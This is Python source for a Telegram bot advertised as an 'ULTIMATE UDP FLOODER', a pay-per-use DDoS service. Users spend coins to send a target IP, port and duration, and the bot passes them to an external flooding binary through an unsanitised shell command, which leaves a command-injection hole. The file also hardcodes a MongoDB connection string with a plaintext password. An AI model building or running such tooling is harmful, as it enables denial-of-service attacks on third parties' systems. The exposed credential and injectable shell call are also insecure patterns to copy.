import asyncio
import json
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

# Load config from config.json
with open("config.json", "r") as f:
    config = json.load(f)

TELEGRAM_BOT_TOKEN = config["BOT_TOKEN"]
ADMIN_USER_ID = config["ADMIN_ID"]

bot_start_time = datetime.now()
attack_in_progress = False
current_attack = None
attack_history = []

MONGO_URI = "mongodb+srv://golem:golempapa123@golem.ijr3g.mongodb.net/?retryWrites=true&w=majority&appName=golem"
DB_NAME = "golem"
COLLECTION_NAME = "users"
ATTACK_TIME_LIMIT = 240
COINS_REQUIRED_PER_ATTACK = 5

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

# User helpers
async def get_user(user_id):
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

# Bot Commands
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❄️ WELCOME TO ULTIMATE UDP FLOODER ❄️*\n\n"
        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
        "Use /help to see all commands."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def golem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only admin can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /coin <add|rem> <user_id> <amount>*", parse_mode='Markdown')
        return

    command, target_user_id, coins = args
    coins = int(coins)
    target_user_id = int(target_user_id)
    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
    else:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid command. Use add or rem.*", parse_mode='Markdown')
        return

    await update_user(target_user_id, new_balance)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} balance updated: {new_balance}*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        return await context.bot.send_message(chat_id=chat_id, text="*💰 Not enough coins. Contact admin.*", parse_mode='Markdown')

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.now()).total_seconds()
        return await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Attack already running. Wait {int(remaining_time)} seconds.*", parse_mode='Markdown')

    if len(args) != 3:
        return await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    if duration > ATTACK_TIME_LIMIT:
        return await context.bot.send_message(chat_id=chat_id, text=f"*⛔ Max allowed duration is {ATTACK_TIME_LIMIT} seconds.*", parse_mode='Markdown')

    await update_user(user_id, user["coins"] - COINS_REQUIRED_PER_ATTACK)
    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)

    await context.bot.send_message(chat_id=chat_id, text="*🚀 Attack launched!*", parse_mode='Markdown')
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    try:
        command = f"./golemxtop {ip} {port} {duration} 999"
        process = await asyncio.create_subprocess_shell(
            command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stderr:
            print(stderr.decode())

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*Error:* {str(e)}", parse_mode='Markdown')

    attack_in_progress = False
    attack_end_time = None
    await context.bot.send_message(chat_id=chat_id, text="*✅ Attack finished.*", parse_mode='Markdown')

async def uptime(update: Update, context: CallbackContext):
    elapsed = datetime.now() - bot_start_time
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰ Uptime:* {elapsed}", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    user = await get_user(update.effective_user.id)
    msg = f"*💰 Coins:* {user['coins']}\n*😎 Status:* Approved"
    await context.bot.send_message(update.effective_chat.id, text=msg, parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    help_text = (
        "*🛠️ Help Menu 🛠️*\n"
        "/attack <ip> <port> <duration>\n"
        "/myinfo - Show your balance\n"
        "/uptime - Show bot uptime\n"
        "/coin add/rem <user_id> <amount> - Admin only"
    )
    await context.bot.send_message(update.effective_chat.id, text=help_text, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("coin", golem))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("help", help))
    application.run_polling()

if __name__ == '__main__':
    main()
    
